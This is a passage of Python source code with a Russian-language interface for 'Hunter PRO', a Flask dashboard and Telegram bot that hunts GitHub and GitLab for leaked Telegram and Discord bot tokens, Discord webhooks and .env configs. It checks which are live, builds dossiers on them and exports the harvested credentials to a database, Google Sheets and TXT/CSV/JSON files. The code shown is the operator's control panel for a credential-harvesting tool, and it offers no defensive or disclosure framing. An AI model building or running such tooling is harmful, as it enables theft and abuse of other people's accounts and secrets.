    <style>
        body {
            background-color: #0d1117;
            color: #00ff88;
            font-family: 'Courier New', monospace;
            padding: 20px;
            margin: 0;
        }
        .container {
            max-width: 960px;
            margin: 0 auto;
        }
        h1 {
            text-align: center;
            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
        }
        .card {
            border: 1px solid #00ff88;
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 20px;
            background: #161b22;
            box-shadow: 0 0 12px rgba(0, 255, 136, 0.12);
        }
        .grid {
            display: flex;
            flex-wrap: wrap;
            gap: 14px;
            margin-bottom: 12px;
        }
        .stat-box {
            flex: 1 1 150px;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 10px;
        }
        .label {
            color: #8b949e;
            font-size: 0.85em;
        }
        .value {
            font-size: 1.25em;
            font-weight: bold;
            margin-top: 4px;
        }
        .log {
            color: #c9d1d9;
            font-size: 0.88em;
            margin-top: 12px;
            line-height: 1.4;
            background: #0d1117;
            padding: 12px;
            border-radius: 6px;
            border: 1px solid #30363d;
            max-height: 360px;
            overflow-y: auto;
        }
        .recent-item {
            padding: 8px 10px;
            border-bottom: 1px solid #21262d;
            color: #e6edf3;
            font-size: 0.88em;
        }
        .recent-item:last-child {
            border-bottom: none;
        }
    </style>
    <script>
        function updateData() {
            fetch('/api/stats')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('time').innerText = data.time;
                    document.getElementById('checked').innerText = data.checked;
                    document.getElementById('found').innerText = data.found + ' / ' + data.limit_label;
                    document.getElementById('db_total').innerText = data.db_total;
                    document.getElementById('hunt_mode').innerText = data.hunt_label;
                    document.getElementById('filter_mode').innerText = data.filter_label;
                    document.getElementById('query').innerText = data.query;
                    document.getElementById('status').innerText = data.status;

                    const logDiv = document.getElementById('logs');
                    logDiv.innerHTML = '';
                    (data.logs || []).forEach(line => {
                        const div = document.createElement('div');
                        div.textContent = '> ' + line;
                        logDiv.appendChild(div);
                    });

                    const recentDiv = document.getElementById('recent');
                    recentDiv.innerHTML = '';
                    const recentList = data.recent_live || [];
                    if (recentList.length === 0) {
                        recentDiv.innerHTML = '<div class="recent-item">Пока нет сохранённых находок</div>';
                    } else {
                        recentList.forEach(item => {
                            const row = document.createElement('div');
                            row.className = 'recent-item';
                            const tag = item.scam ? '[СКАМ/WH]' : '[НОРМ]';
                            row.textContent = `${tag} [${item.type}] @${item.bot} — ${item.token}`;
                            recentDiv.appendChild(row);
                        });
                    }
                })
                .catch(() => {});
        }
        setInterval(updateData, 2000);
        window.onload = updateData;
    </script>
</head>
<body>
    <div class="container">
        <h1>[ HUNTER DASHBOARD PRO ]</h1>
        <div class="card">
            <div class="grid">
                <div class="stat-box">
                    <div class="label">Время работы</div>
                    <div class="value" id="time">00:00:00</div>
                </div>
                <div class="stat-box">
                    <div class="label">Проверено токенов</div>
                    <div class="value" id="checked">0</div>
                </div>
                <div class="stat-box">
                    <div class="label">Найдено за сессию</div>
                    <div class="value" id="found">0 / 5</div>
                </div>
                <div class="stat-box">
                    <div class="label">Всего в базе</div>
                    <div class="value" id="db_total">0</div>
                </div>
                <div class="stat-box">
                    <div class="label">Режим охоты</div>
                    <div class="value" id="hunt_mode">Всё подряд</div>
                </div>
                <div class="stat-box">
                    <div class="label">Фильтр сессии</div>
                    <div class="value" id="filter_mode">Все живые</div>
                </div>
            </div>
            <p><strong>Запрос:</strong> <span id="query">...</span></p>
            <p><strong>Статус:</strong> <span id="status">...</span></p>
            <div class="log" id="logs"></div>
        </div>

        <div class="card">
            <h3 style="margin-top:0;">Последние находки в базе</h3>
            <div id="recent"></div>
        </div>
    </div>
</body>
</html>
"""


@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE)


@app.route("/favicon.ico")
def favicon():
    return "", 204


@app.route("/health")
def health():
    return jsonify({"status": "ok", "timestamp": now_kyiv().isoformat()}), 200


@app.route("/api/stats")
def api_stats():
    snap = get_state_snapshot()
    live_all = load_live_tokens()
    limit_val = snap["limit_live"]
    limit_label = "∞" if limit_val >= 999 else str(limit_val)
    filter_label = FILTER_MODES.get(snap["filter_mode"], snap["filter_mode"])
    hunt_label = HUNT_MODES.get(snap["hunt_mode"], snap["hunt_mode"])

    return jsonify({
        "time": snap["time"],
        "checked": snap["checked_tokens"],
        "found": snap["found_live_current"],
        "limit": limit_val,
        "limit_label": limit_label,
        "hunt_mode": snap["hunt_mode"],
        "hunt_label": hunt_label,
        "filter_mode": snap["filter_mode"],
        "filter_label": filter_label,
        "db_total": len(live_all),
        "query": snap["current_query"],
        "status": snap["status_text"],
        "logs": snap["logs"],
        "recent_live": list(reversed(live_all[-10:])),
    })


@app.route("/api/stop", methods=["POST"])
def api_stop():
    with state_lock:
        search_state["stop_requested"] = True
        search_state["status_text"] = "Остановлено через API"
    add_log("🛑 Получена команда остановки через веб-API")
    return jsonify({"ok": True, "status": "stopping"}), 200


# =====================================================================
# ТЕЛЕГРАМ-БОТ: ИНТЕРФЕЙС, ОХОТА, РУЧНАЯ ПРОВЕРКА, ФИЛЬТРЫ И ЭКСПОРТ
# =====================================================================
def get_main_menu() -> types.ReplyKeyboardMarkup:
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        "🚀 Начать поиск",
        "🛑 Остановить",
        "🎯 Охота",
        "🧪 Проверка токена",
        "🎛 Фильтр сессии",
        "⚙️ Настройки",
        "🗂 База и Экспорт",
    )
    return markup


def get_progress_buttons() -> types.InlineKeyboardMarkup:
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 График", callback_data="show_chart"),
        types.InlineKeyboardButton("🏆 Топ-5", callback_data="show_top5"),
        types.InlineKeyboardButton("🎯 Охота", callback_data="quick_hunt"),
        types.InlineKeyboardButton("🎛 Фильтр", callback_data="quick_filter"),
        types.InlineKeyboardButton("🔄 Обновить", callback_data="force_update"),
        types.InlineKeyboardButton("🛑 Стоп", callback_data="stop_search_btn"),
    )
    return markup


def get_hunt_keyboard() -> types.InlineKeyboardMarkup:
    snap = get_state_snapshot()
    cur = snap["hunt_mode"]

    def mark(mode_key: str, title: str) -> str:
        return f"✅ {title}" if cur == mode_key else title

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton(mark("all", "Всё подряд (TG + DC + Webhooks)"), callback_data="sethunt_all"),
        types.InlineKeyboardButton(mark("tg", "Только Telegram-боты"), callback_data="sethunt_tg"),
        types.InlineKeyboardButton(mark("dc", "Только Discord-боты и Webhooks"), callback_data="sethunt_dc"),
        types.InlineKeyboardButton(mark("env", "Фокус на .env и конфиги"), callback_data="sethunt_env"),
    )
    return markup


def _build_hunt_menu_text() -> str:
    snap = get_state_snapshot()
    cur_label = HUNT_MODES.get(snap["hunt_mode"], snap["hunt_mode"])
    return (
        f"🎯 <b>Режим охоты</b>\n\n"
        f"Текущая цель: <code>{html.escape(cur_label)}</code>\n\n"
        f"<i>Определяет, какие поисковые запросы и фильтры файлов отправлять в GitHub и GitLab. Можно менять даже на лету.</i>"
    )


def get_filter_keyboard() -> types.InlineKeyboardMarkup:
    snap = get_state_snapshot()
    cur = snap["filter_mode"]

    def mark(mode_key: str, title: str) -> str:
        return f"✅ {title}" if cur == mode_key else title

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton(mark("all", "Все живые (в чат + в таблицу)"), callback_data="setfilter_all"),
        types.InlineKeyboardButton(mark("no_scam", "Только не-скам (без скам-ботов и webhook)"), callback_data="setfilter_no_scam"),
        types.InlineKeyboardButton(mark("tg_only", "Только Telegram-боты"), callback_data="setfilter_tg_only"),
    )
    return markup


def _build_filter_menu_text() -> str:
    snap = get_state_snapshot()
    cur_label = FILTER_MODES.get(snap["filter_mode"], snap["filter_mode"])
    return (
        f"🎛 <b>Фильтр находок во время поиска</b>\n\n"
        f"Текущий режим: <code>{html.escape(cur_label)}</code>\n"
        f"Пропущено фильтром за сессию: <code>{snap['skipped_by_filter']}</code>\n\n"
        f"<i>Режим можно менять прямо во время активного поиска — он применится на лету к новым находкам (в чат и в Google Таблицу).</i>"
    )


@bot.message_handler(commands=["start"])
def send_welcome(message: types.Message):
    user_id = message.from_user.id if message.from_user else None
    if not is_admin(message.chat.id, user_id):
        return

    sheets_ok = bool(SPREADSHEET_ID and (GOOGLE_CREDS_B64 or GOOGLE_CREDS_JSON_RAW))
    sheets_status = "подключён" if sheets_ok else "не настроен"
    snap = get_state_snapshot()
    cur_filter = FILTER_MODES.get(snap["filter_mode"], snap["filter_mode"])
    cur_hunt = HUNT_MODES.get(snap["hunt_mode"], snap["hunt_mode"])

    welcome_text = (
        "👋 <b>Пульт Hunter PRO</b>\n"
        "Сканер токенов и вебхуков с ручной проверкой, досье (вкл. webhook), режимами охоты, фильтрами и экспортом.\n\n"
        f"☁️ Google Sheets: <code>{html.escape(sheets_status)}</code>\n"
        f"🎯 Охота: <code>{html.escape(cur_hunt)}</code>\n"
        f"🎛 Фильтр сессии: <code>{html.escape(cur_filter)}</code>\n"
        f"🗂 Записей в базе: <code>{len(load_live_tokens())}</code>\n\n"
        "<b>Команды:</b>\n"
        "/check &lt;токен или webhook&gt; — ручная проверка\n"
        "/hunt — выбрать режим охоты\n"
        "/filter — переключить фильтр сессии\n"
        "/status — быстрый статус"
    )
    bot.send_message(
        message.chat.id,
        welcome_text,
        reply_markup=get_main_menu(),
        parse_mode="HTML",
    )


@bot.message_handler(commands=["status"])
def cmd_status(message: types.Message):
    user_id = message.from_user.id if message.from_user else None
    if not is_admin(message.chat.id, user_id):
        return

    snap = get_state_snapshot()
    cur_filter = FILTER_MODES.get(snap["filter_mode"], snap["filter_mode"])
    cur_hunt = HUNT_MODES.get(snap["hunt_mode"], snap["hunt_mode"])
    limit_str = "∞" if snap["limit_live"] >= 999 else str(snap["limit_live"])
    running_str = "Активен" if snap["is_searching"] else "Остановлен"

    text = (
        f"📡 <b>Статус Hunter PRO</b>\n\n"
        f"• Состояние: <code>{html.escape(running_str)}</code>\n"
        f"• Статус задачи: <code>{html.escape(snap['status_text'])}</code>\n"
        f"• Охота: <code>{html.escape(cur_hunt)}</code>\n"
        f"• Время: <code>{html.escape(snap['time'])}</code>\n"
        f"• Проверено: <code>{snap['checked_tokens']}</code>\n"
        f"• Живых за сессию: <code>{snap['found_live_current']} / {limit_str}</code>\n"
        f"• Пропущено фильтром: <code>{snap['skipped_by_filter']}</code>\n"
        f"• Фильтр: <code>{html.escape(cur_filter)}</code>\n"
        f"• Записей в базе: <code>{len(load_live_tokens())}</code>"
    )
    bot.send_message(message.chat.id, text, parse_mode="HTML")


@bot.message_handler(commands=["hunt"])
@bot.message_handler(func=lambda m: m.text == "🎯 Охота")
def show_hunt_menu(message: types.Message):
    user_id = message.from_user.id if message.from_user else None
    if not is_admin(message.chat.id, user_id):
        return

    bot.send_message(
        message.chat.id,
        _build_hunt_menu_text(),
        reply_markup=get_hunt_keyboard(),
        parse_mode="HTML",
    )


@bot.callback_query_handler(func=lambda call: call.data == "quick_hunt")
def cb_quick_hunt(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    bot.answer_callback_query(call.id)
    if chat_id:
        bot.send_message(
            chat_id,
            _build_hunt_menu_text(),
            reply_markup=get_hunt_keyboard(),
            parse_mode="HTML",
        )


@bot.callback_query_handler(func=lambda call: call.data.startswith("sethunt_"))
def cb_set_hunt(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    mode_key = call.data.split("_", 1)[1]
    if mode_key not in HUNT_MODES:
        bot.answer_callback_query(call.id, "Неизвестный режим охоты")
        return

    with state_lock:
        search_state["hunt_mode"] = mode_key

    label = HUNT_MODES[mode_key]
    add_log(f"🎯 Выбран режим охоты: {label}")
    bot.answer_callback_query(call.id, f"Охота: {label}")

    if call.message:
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=_build_hunt_menu_text(),
                reply_markup=get_hunt_keyboard(),
                parse_mode="HTML",
            )
        except Exception:
            pass


@bot.message_handler(commands=["filter"])
@bot.message_handler(func=lambda m: m.text == "🎛 Фильтр сессии")
def show_filter_menu(message: types.Message):
    user_id = message.from_user.id if message.from_user else None
    if not is_admin(message.chat.id, user_id):
        return

    bot.send_message(
        message.chat.id,
        _build_filter_menu_text(),
        reply_markup=get_filter_keyboard(),
        parse_mode="HTML",
    )


@bot.callback_query_handler(func=lambda call: call.data == "quick_filter")
def cb_quick_filter(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    bot.answer_callback_query(call.id)
    if chat_id:
        bot.send_message(
            chat_id,
            _build_filter_menu_text(),
            reply_markup=get_filter_keyboard(),
            parse_mode="HTML",
        )


@bot.callback_query_handler(func=lambda call: call.data.startswith("setfilter_"))
def cb_set_filter(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    mode_key = call.data.split("_", 1)[1]
    if mode_key not in FILTER_MODES:
        bot.answer_callback_query(call.id, "Неизвестный фильтр")
        return

    with state_lock:
        search_state["filter_mode"] = mode_key

    label = FILTER_MODES[mode_key]
    add_log(f"🎛 Переключён фильтр сессии: {label}")
    bot.answer_callback_query(call.id, f"Фильтр: {label}")

    if call.message:
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=_build_filter_menu_text(),
                reply_markup=get_filter_keyboard(),
                parse_mode="HTML",
            )
        except Exception:
            pass


# --- РУЧНАЯ ПРОВЕРКА ТОКЕНА / ВЕБХУКА ---
@bot.message_handler(commands=["check"])
def cmd_check(message: types.Message):
    user_id = message.from_user.id if message.from_user else None
    if not is_admin(message.chat.id, user_id):
        return

    raw_text = message.text or ""
    parts = raw_text.split(maxsplit=1)
    if len(parts) == 2 and parts[1].strip():
        _run_manual_check_and_reply(message.chat.id, parts[1].strip())
        return

    if user_id is not None:
        with state_lock:
            awaiting_manual_check[user_id] = time.time() + 120

    bot.send_message(
        message.chat.id,
        "🧪 <b>Ручная проверка</b>\n\n"
        "Отправь следующим сообщением Telegram-токен, Discord Bot Token или ссылку на Discord Webhook (в течение 2 минут).",
        parse_mode="HTML",
    )


@bot.message_handler(func=lambda m: m.text == "🧪 Проверка токена")
def btn_manual_check(message: types.Message):
    user_id = message.from_user.id if message.from_user else None
    if not is_admin(message.chat.id, user_id):
        return

    if user_id is not None:
        with state_lock:
            awaiting_manual_check[user_id] = time.time() + 120

    bot.send_message(
        message.chat.id,
        "🧪 <b>Ручная проверка токена или webhook</b>\n\n"
        "Скинь сюда ключ или ссылку <code>https://discord.com/api/webhooks/...</code> — проверю статус, скам-признаки и соберу досье (вкл. webhook TG-бота).",
        parse_mode="HTML",
    )


def _run_manual_check_and_reply(chat_id: int, target_str: str) -> None:
    wait_msg = bot.send_message(chat_id, "⏳ <i>Проверяю цель и собираю досье...</i>", parse_mode="HTML")

    def _worker():
        report_html, token_info = manual_check_target(target_str)
        if token_info is not None:
            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton("💾 Сохранить в базу и Sheets", callback_data="save_manual_last")
            )
            with state_lock:
                search_state["_last_manual_token"] = token_info
            try:
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=wait_msg.message_id,
                    text=report_html,
                    parse_mode="HTML",
                    reply_markup=markup,
                    disable_web_page_preview=True,
                )
            except Exception:
                bot.send_message(
                    chat_id,
                    report_html,
                    parse_mode="HTML",
                    reply_markup=markup,
                    disable_web_page_preview=True,
                )
        else:
            try:
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=wait_msg.message_id,
                    text=report_html,
                    parse_mode="HTML",
                    disable_web_page_preview=True,
                )
            except Exception:
                bot.send_message(
                    chat_id,
                    report_html,
                    parse_mode="HTML",
                    disable_web_page_preview=True,
                )

    threading.Thread(target=_worker, daemon=True).start()


@bot.callback_query_handler(func=lambda call: call.data == "save_manual_last")
def cb_save_manual_last(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    with state_lock:
        last_item = search_state.get("_last_manual_token")

    if not last_item:
        bot.answer_callback_query(call.id, "Данные проверки устарели.")
        return

    added = save_live_token(last_item)
    if added:
        add_log(f"💾 Ручная находка сохранена в базу: {last_item.get('bot')}")
        bot.answer_callback_query(call.id, "Сохранено в базу и отправлено в Sheets!")
    else:
        bot.answer_callback_query(call.id, "Этот ключ уже есть в базе.")


# --- НАСТРОЙКИ И ОСТАНОВКА ---
@bot.message_handler(func=lambda m: m.text == "⚙️ Настройки")
def show_settings(message: types.Message):
    user_id = message.from_user.id if message.from_user else None
    if not is_admin(message.chat.id, user_id):
        return

    snap = get_state_snapshot()
    current_limit = snap["limit_live"]
    limit_label = "Без лимита" if current_limit >= 999 else str(current_limit)
    cur_filter = FILTER_MODES.get(snap["filter_mode"], snap["filter_mode"])
    cur_hunt = HUNT_MODES.get(snap["hunt_mode"], snap["hunt_mode"])

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("1", callback_data="limit_1"),
        types.InlineKeyboardButton("5", callback_data="limit_5"),
        types.InlineKeyboardButton("10", callback_data="limit_10"),
        types.InlineKeyboardButton("∞", callback_data="limit_999"),
    )
    bot.send_message(
        message.chat.id,
        f"⚙️ <b>Настройки поиска</b>\n\n"
        f"• Лимит живых находок: <code>{html.escape(limit_label)}</code>\n"
        f"• Режим охоты: <code>{html.escape(cur_hunt)}</code>\n"
        f"• Фильтр сессии: <code>{html.escape(cur_filter)}</code>",
        reply_markup=markup,
        parse_mode="HTML",
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("limit_"))
def callback_settings(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    try:
        limit = int(call.data.split("_", 1)[1])
    except ValueError:
        bot.answer_callback_query(call.id, "Некорректное значение")
        return

    with state_lock:
        search_state["limit_live"] = limit

    bot.answer_callback_query(call.id, "Лимит обновлён!")
    label = "Без лимита" if limit >= 999 else str(limit)
    if call.message:
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"✅ <b>Новый лимит:</b> <code>{html.escape(label)}</code>",
                parse_mode="HTML",
            )
        except Exception:
            pass


@bot.message_handler(func=lambda m: m.text == "🛑 Остановить")
def stop_command(message: types.Message):
    user_id = message.from_user.id if message.from_user else None
    if not is_admin(message.chat.id, user_id):
        return

    with state_lock:
        search_state["stop_requested"] = True
        search_state["status_text"] = "Остановка..."
    add_log("⏹️ Команда остановки из меню бота")
    bot.send_message(message.chat.id, "⏹️ Команда остановки принята.")


# --- БАЗА, ФИЛЬТРЫ И ЭКСПОРТ (.TXT / .CSV / .JSON) ---
@bot.message_handler(func=lambda m: m.text == "🗂 База и Экспорт")
def show_db_menu(message: types.Message):
    user_id = message.from_user.id if message.from_user else None
    if not is_admin(message.chat.id, user_id):
        return

    live_tokens = load_live_tokens()
    seen_count = len(load_seen_tokens())

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("Все", callback_data="db_all"),
        types.InlineKeyboardButton("Telegram", callback_data="db_tg"),
        types.InlineKeyboardButton("Discord", callback_data="db_dc"),
        types.InlineKeyboardButton("Скам / WH", callback_data="db_scam"),
        types.InlineKeyboardButton("📄 Экспорт .TXT", callback_data="export_txt"),
        types.InlineKeyboardButton("📊 Экспорт .CSV", callback_data="export_csv"),
        types.InlineKeyboardButton("🧾 Экспорт .JSON", callback_data="export_json"),
        types.InlineKeyboardButton("🧹 Сброс seen-кэша", callback_data="clear_seen"),
    )
    bot.send_message(
        message.chat.id,
        f"🗂 <b>База находок:</b> <code>{len(live_tokens)}</code> | "
        f"<b>В кэше проверенных:</b> <code>{seen_count}</code>\n"
        "Выбери фильтр или формат выгрузки:",
        reply_markup=markup,
        parse_mode="HTML",
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("db_"))
def cb_show_db(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    live_tokens = load_live_tokens()
    if not live_tokens:
        bot.answer_callback_query(call.id, "База пуста!")
        return

    filter_type = call.data.split("_", 1)[1]
    filtered = []

    for item in live_tokens:
        p_type = item.get("type", "")
        is_scam = bool(item.get("scam"))
        if filter_type == "all":
            filtered.append(item)
        elif filter_type == "tg" and p_type == "Telegram":
            filtered.append(item)
        elif filter_type == "dc" and p_type == "Discord":
            filtered.append(item)
        elif filter_type == "scam" and (is_scam or p_type == "Webhook"):
            filtered.append(item)

    if not filtered:
        bot.answer_callback_query(call.id, "По этому фильтру записей нет.")
        return

    bot.answer_callback_query(call.id, f"Найдено записей: {len(filtered)}")
    lines = [f"🗂 <b>База ({html.escape(filter_type)}) — последние {min(len(filtered), 15)}:</b>\n"]
    for item in filtered[-15:]:
        scam_icon = "⚠️" if (item.get("scam") or item.get("type") == "Webhook") else "✅"
        plat = html.escape(str(item.get("type", "TG"))[:3].upper())
        tok = html.escape(str(item.get("token", "")))
        bot_name = html.escape(str(item.get("bot", "")))
        lines.append(f"{scam_icon} <b>[{plat}]</b> {bot_name}\n<code>{tok}</code>")

    if chat_id:
        bot.send_message(
            chat_id,
            "\n".join(lines),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )


@bot.callback_query_handler(
    func=lambda call: call.data in ("export_txt", "export_csv", "export_json")
)
def cb_export_db(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    live_tokens = load_live_tokens()
    if not live_tokens:
        bot.answer_callback_query(call.id, "База пуста, нечего экспортировать.")
        return

    stamp = kyiv_time_str("%Y%m%d_%H%M%S")
    fmt = call.data.split("_", 1)[1]

    if fmt == "txt":
        text_buf = io.StringIO()
        for item in live_tokens:
            text_buf.write(
                f"[{item.get('type', 'TG')}] "
                f"@{item.get('bot', 'unknown')} | "
                f"{item.get('token', '')} | "
                f"{item.get('url', '')} | "
                f"scam={item.get('scam', False)}\n"
            )
        raw_bytes = text_buf.getvalue().encode("utf-8")
        filename = f"live_tokens_{stamp}.txt"
    elif fmt == "csv":
        csv_buf = io.StringIO()
        writer = csv.writer(csv_buf)
        writer.writerow(["found_at", "type", "bot", "token", "repo", "url", "scam"])
        for item in live_tokens:
            writer.writerow([
                item.get("found_at", ""),
                item.get("type", ""),
                item.get("bot", ""),
                item.get("token", ""),
                item.get("repo", ""),
                item.get("url", ""),
                bool(item.get("scam", False)),
            ])
        raw_bytes = csv_buf.getvalue().encode("utf-8-sig")
        filename = f"live_tokens_{stamp}.csv"
    else:
        raw_bytes = json.dumps(live_tokens, ensure_ascii=False, indent=2).encode("utf-8")
        filename = f"live_tokens_{stamp}.json"

    bot.answer_callback_query(call.id, f"Выгружаю {fmt.upper()}...")
    out_stream = io.BytesIO(raw_bytes)
    out_stream.seek(0)
    if chat_id:
        bot.send_document(chat_id, out_stream, visible_file_name=filename)


@bot.callback_query_handler(func=lambda call: call.data == "clear_seen")
def cb_clear_seen(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    clear_seen_tokens()
    add_log("🧹 Кэш seen_tokens.txt очищен пользователем")
    bot.answer_callback_query(call.id, "Кэш проверенных токенов очищен!")


@bot.callback_query_handler(func=lambda call: call.data == "show_chart")
def cb_show_chart(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    bot.answer_callback_query(call.id, "Строю график...")
    buf = generate_stats_chart()
    if chat_id:
        bot.send_photo(chat_id, buf, caption="📊 Статистика поиска")


@bot.callback_query_handler(func=lambda call: call.data == "show_top5")
def cb_show_top5(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    live_tokens = load_live_tokens()
    if not live_tokens:
        bot.answer_callback_query(call.id, "База пока пуста.")
        return

    bot.answer_callback_query(call.id, "Собираю топ...")
    owners = []
    for item in live_tokens:
        repo = str(item.get("repo", ""))
        if "/" in repo:
            owners.append(repo.split("/", 1)[0])
        elif repo:
            owners.append(repo)

    top = Counter(owners).most_common(5)
    lines = ["🏆 <b>Топ-5 источников по находкам:</b>\n"]
    for idx, (owner, count) in enumerate(top, 1):
        safe_owner = html.escape(owner)
        if owner.startswith("gitlab/") or owner == "manual":
            lines.append(f"{idx}. <code>{safe_owner}</code> — <b>{count}</b>")
        else:
            lines.append(
                f"{idx}. <a href='https://github.com/{urllib.parse.quote(owner)}'>{safe_owner}</a> — <b>{count}</b>"
            )

    if chat_id:
        bot.send_message(
            chat_id,
            "\n".join(lines),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )


@bot.callback_query_handler(func=lambda call: call.data == "stop_search_btn")
def cb_stop_search(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    with state_lock:
        search_state["stop_requested"] = True
        search_state["status_text"] = "Остановка..."
    add_log("⏹️ Нажата инлайн-кнопка Стоп")
    bot.answer_callback_query(call.id, "Останавливаю поиск...")


@bot.callback_query_handler(func=lambda call: call.data == "force_update")
def cb_force_update(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    bot.answer_callback_query(call.id, "Обновлено")
    if call.message:
        update_progress_message(call.message.chat.id, call.message.message_id)


@bot.message_handler(
    func=lambda m: bool(m.text) and not m.text.startswith("/") and m.text not in {
        "🚀 Начать поиск",
        "🛑 Остановить",
        "🎯 Охота",
        "🧪 Проверка токена",
        "🎛 Фильтр сессии",
        "⚙️ Настройки",
        "🗂 База и Экспорт",
    }
)
def handle_manual_target_text(message: types.Message):
    user_id = message.from_user.id if message.from_user else None
    if not is_admin(message.chat.id, user_id) or user_id is None:
        return

    now_ts = time.time()
    should_check = False
    with state_lock:
        exp = awaiting_manual_check.get(user_id)
        if exp is not None:
            del awaiting_manual_check[user_id]
            if now_ts <= exp:
                should_check = True

    if should_check and message.text:
        _run_manual_check_and_reply(message.chat.id, message.text)


# =====================================================================
# ЗАПУСК ПОИСКА, ФИЛЬТРАЦИЯ НА ЛЕТУ И СВОДНЫЙ ОТЧЁТ
# =====================================================================
@bot.message_handler(func=lambda m: m.text == "🚀 Начать поиск")
def start_search_command(message: types.Message):
    user_id = message.from_user.id if message.from_user else None
    if not is_admin(message.chat.id, user_id):
        return

    with state_lock:
        if search_state["is_searching"]:
            bot.send_message(message.chat.id, "⚠️ Поиск уже запущен!")
            return

        search_state.update({
            "is_searching": True,
            "stop_requested": False,
            "found_live_current": 0,
            "skipped_by_filter": 0,
            "checked_tokens": 0,
            "dead_tokens": 0,
            "scam_tokens": 0,
            "tg_found": 0,
            "dc_found": 0,
            "wh_found": 0,
            "start_time": time.time(),
            "current_query": "Подготовка запроса...",
            "status_text": "Запуск...",
            "logs": [],
            "phrase": "Инициализация сканера...",
        })

    add_log("🚀 Старт поисковой сессии")

    if SPREADSHEET_ID and (GOOGLE_CREDS_B64 or GOOGLE_CREDS_JSON_RAW):
        threading.Thread(target=get_google_worksheet, daemon=True).start()

    msg = bot.send_message(
        message.chat.id,
        "⏳ <b>Инициализация сканера...</b>",
        parse_mode="HTML",
    )
    threading.Thread(
        target=live_ui_updater,
        args=(message.chat.id, msg.message_id),
        daemon=True,
    ).start()
    threading.Thread(
        target=run_search_task,
        args=(message.chat.id, msg.message_id),
        daemon=True,
    ).start()


def live_ui_updater(chat_id: int, msg_id: int) -> None:
    spinner_idx = 0
    while True:
        with state_lock:
            active = search_state["is_searching"] and not search_state["stop_requested"]
            if active:
                search_state["phrase"] = random.choice(HACKER_PHRASES)
        if not active:
            break

        update_progress_message(chat_id, msg_id, spinner_idx)
        spinner_idx += 1
        _sleep_respecting_stop(6)


def update_progress_message(chat_id: int, msg_id: int, spinner_idx: int = 0) -> None:
    snap = get_state_snapshot()
    spinner = SPINNERS[spinner_idx % len(SPINNERS)]

    logs_raw = "\n".join(snap["logs"]) if snap["logs"] else "> Ожидание событий..."
    safe_logs = html.escape(logs_raw)
